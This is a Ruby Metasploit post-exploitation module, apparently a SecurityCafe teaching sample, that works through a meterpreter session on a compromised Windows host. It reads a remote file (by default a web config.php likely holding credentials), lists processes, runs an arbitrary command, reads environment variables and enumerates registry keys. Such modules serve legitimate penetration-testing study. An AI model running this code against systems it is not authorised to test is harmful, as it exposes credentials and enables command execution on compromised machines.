##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/windows'
require 'rex'
 
class Metasploit3 < Msf::Post
 
 include Msf::Post::File
 include Msf::Post::Windows::Registry
 
 def initialize(info={})
   super(update_info(info,
     'Name' => 'Windows Gather SecurityCafe Test',
     'Description' => %q{
       This module is for tests
     },
     'License' => MSF_LICENSE,
     'Author' => [ 'Ionut Popescu <contact[-at-]securitycafe.ro>' ],
     'Platform' => [ 'win' ],
     'Arch' => [ 'x86' ],
     'SessionTypes' => [ 'meterpreter' ],
 ))
 
 register_options(
 [
   OptString.new('READFILE', [ true, 'Read a remote file: E.g. C:\\Wamp\\www\\config.php', 'C:\\Wamp\\www\\config.php' ]),
   OptBool.new( 'LISTPROCESSES', [ true, 'True if you want to list processes', 'TRUE' ]),
   OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ]),
   OptString.new('CMDEXEC', [ true, 'Command to execute', 'ipconfig' ]),
   OptString.new('ENVIRONMENT', [ true, 'Enviroment variable to read. E.g. PATH', 'PATH' ]),
   OptString.new('REGISTRY', [ true, 'Registry data to read. E.g. HKLM\\SYSTEM\\ControlSet001\\Services', 'HKLM\\SYSTEM\\ControlSet001\\Services' ]),
 ], self.class)
 end
 
 # Main method
 
 def run
 
   readfile = datastore['READFILE']
   listprocesses = datastore['LISTPROCESSES']
   systeminfo = datastore['SYSTEMINFO']
   cmdexec = datastore['CMDEXEC']
   environment = datastore['ENVIRONMENT']
   registry = datastore['REGISTRY']
 
   print_status('Starting module...')
   print_line('')
 
   # Read the file
 
   if exist?(readfile)
     file_contents = read_file(readfile)
     print_good('File contents:')
     print_line('')
     print_line(file_contents)
     print_line('')
   else
     print_error('Cannot read specified file!')
   end
 
   # Print processes if it is requested
 
   if listprocesses == TRUE
 
     print_status('Process list:')
     print_line('')
 
     session.sys.process.get_processes().each do |x|
       print_good("#{x['name']} [#{x['pid']}]")
     end
 
   print_line('')
 
   end
 
   # System info
 
   if systeminfo == TRUE
 
   print_good("OS: #{session.sys.config.sysinfo['OS']}")
   print_good("Computer name: #{'Computer'} ")
   print_good("Current user: #{session.sys.config.getuid}")
   print_line('')
 
   end
 
   # Execute command
 
   print_status("Executing command: #{cmdexec}")
   print_line('')
 
   command_output = cmd_exec(cmdexec)
   print_line(command_output)
   print_line('')
 
   # Get environment variables
 
   environment_var = session.sys.config.getenv(environment)
   other_environ = session.sys.config.getenvs('USERNAME', 'TMP', 'COMPUTERNAME')
 
   print_good("Environment variable #{environment} = #{environment_var}")
   print_good("Username: #{other_environ['USERNAME']}")
   print_good("Temporary data folder: #{other_environ['TMP']}")
   print_good("Computer name: #{other_environ['COMPUTERNAME']}")
   print_line('')
 
   # Read registry data
 
   print_status("Enumerate registry keys from #{registry}")
   print_line('')
 
   reg_vals = registry_enumkeys(registry)
   reg_vals.each do |x|
       print_good("Service: #{x}")
   end
   print_line('')
 
 end
 
end
